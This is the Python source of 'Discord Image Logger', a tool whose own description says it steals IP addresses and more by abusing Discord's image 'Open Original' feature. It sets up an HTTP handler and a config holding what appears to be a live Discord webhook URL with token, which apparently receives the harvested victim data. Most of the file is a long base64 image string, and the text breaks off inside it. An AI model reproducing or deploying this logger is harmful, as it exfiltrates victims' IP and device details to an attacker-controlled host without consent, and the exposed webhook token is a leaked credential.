# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1340118544007827587/wt2hAg_xuq8nGY9b6IzuJYN0inRjhcDoHefbjRvETU4brL6P2pV2YuGABnOUnE6Fv_yL",
    "image": "data:image/png;base64,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